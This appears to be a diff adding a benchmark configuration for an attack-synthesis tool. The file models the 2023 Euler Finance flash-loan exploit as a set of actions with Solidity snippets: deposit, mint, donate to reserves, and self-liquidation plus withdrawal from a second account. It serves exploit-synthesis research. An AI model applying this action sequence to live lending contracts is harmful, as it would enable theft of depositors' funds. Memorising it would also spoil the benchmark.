@@ -1,0 +1,119 @@
+# Euler Finance exploit, 13 Mar 2023, block 16818064. Declarative benchmark: the
+# flashsyn CLI builds the action model from this file; the Solidity harness (setUp /
+# interfaces / profitSummary, and the contract-level `temp`/`repay`/`yield` locals the
+# liquidation action reuses) lives next to it in attack.t.sol.
+
+name = "euler"
+contract = "euler"       # --match-contract name in attack.t.sol
+chain = "ETH"
+block = 16818064
+max_synthesis_len = 6
+
+# Prototype: derive every collector from `effects` and emit it through the harness's
+# Collect helper (collect.balanceChange), instead of a hand-written `collector` field.
+# See attack.t.sol's Collect contract. Decimals come from token_info below.
+use_collect_helper = true
+
+# Profit = (final - initial) * price over these, in profitSummary() output order.
+profit_tokens = ["USDC"]
+
+# Attacker starts with 400M USDC flash-loaned — must match setUp() in attack.t.sol.
+[initial_balances]
+USDC = 400000000
+
+[token_prices]
+USDC = 1.0
+
+# token -> [contract variable in the harness, decimals]. The generated collectors read
+# balanceOf(<var>) and scale by <decimals>, so every measured token needs an entry.
+[token_info]
+eUSDC = ["eUSDC", 18]
+dUSDC = ["dUSDC", 6]
+USDC = ["USDC", 6]
+
+# deposit USDC -> eUSDC. A plain deposit: the derived balanceOf collector and the
+# default transit (USDC -= param, eUSDC += approx) both apply, so no escape hatches.
+[[actions]]
+name = "eulerDeposit"
+tokens_in = ["USDC"]
+tokens_out = ["eUSDC"]
+range = [0, 200000000]
+solidity = "eUSDC.deposit(0, $$ * 1e6);"
+
+# burn eUSDC. No net token received (tokens_out empty); the two consumed amounts are
+# subtracted. The collector is derived from effects: two `sub` -> two before-after deltas
+# (eUSDC as approx0, dUSDC as approx1), scaled by their token_info decimals.
+[[actions]]
+name = "eulerBurn"
+tokens_in = ["eUSDC", "dUSDC"]
+tokens_out = []
+range = [0, 200000]
+solidity = "eUSDC.burn(0, $$ * 1e18);"
+effects = [
+  { token = "eUSDC", op = "sub", src = "approx0" },
+  { token = "dUSDC", op = "sub", src = "approx1" },
+]
+
+# touch: a no-op state poke. No parameter, no measured output, no balance change.
+[[actions]]
+name = "eulerTouch"
+tokens_in = []
+tokens_out = []
+range = []
+solidity = "eUSDC.touch();"
+# No approx effects -> nothing measured -> collect.flush() reverts "FlashSyn: 0".
+effects = []
+
+# donate eUSDC to reserves. No token received; the collector measures the consumed
+# eUSDC, which is subtracted.
+[[actions]]
+name = "eulerDonate"
+tokens_in = ["eUSDC"]
+tokens_out = []
+range = [0, 2000000000]
+solidity = "eUSDC.donateToReserves(0, $$ * 1e18);"
+effects = [
+  { token = "eUSDC", op = "sub", src = "approx0" },
+]
+
+# mint eUSDC. Inverts the default model: the search parameter is the dUSDC debt taken
+# on (received), and the eUSDC minted is the approximated quantity the collector reads.
+[[actions]]
+name = "eulerMint"
+tokens_in = ["eUSDC"]
+tokens_out = ["eUSDC", "dUSDC"]
+range = [0, 2000000000]
+solidity = "eUSDC.mint(0, $$ * 1e6);"
+effects = [
+  { token = "dUSDC", op = "add", src = "param0" },
+  { token = "eUSDC", op = "add", src = "approx0" },
+]
+
+# liquidate the attacker's own position from a second account, then withdraw the USDC.
+# Multi-statement Solidity with prank switching; the debt/collateral positions are
+# closed out (set to 0) and the recovered USDC is the approximated output.
+[[actions]]
+name = "eulerLiquidateWithdraw"
+tokens_in = ["dUSDC", "eUSDC"]
+tokens_out = ["USDC"]
+range = []
+solidity = """
+        vm.stopPrank();
+        vm.startPrank(attacker2);
+        temp = Liquidation.checkLiquidation(address(attacker2), address(attacker), address(USDC), address(USDC));
+        repay = temp.repay;
+        yield = temp.yield;
+        Liquidation.liquidate(address(attacker), address(USDC), address(USDC), repay, yield);
+        eUSDC.burn(0, type(uint).max);
+        eUSDC.withdraw(0, type(uint).max);
+        USDC.transfer(address(attacker), USDC.balanceOf(address(attacker2)));
+        vm.stopPrank();
+        vm.startPrank(attacker);"""
+# Collector derived from effects: USDC `add` -> after-before delta (approx0); the `set 0`
+# effects are bookkeeping only (not measured). The whole multi-statement action is
+# bracketed by the USDC read, so the prank switching is captured in the net delta.
+effects = [
+  { token = "USDC", op = "add", src = "approx0" },
+  { token = "dUSDC", op = "set", src = "0" },
+  { token = "eUSDC", op = "set", src = "0" },
+]
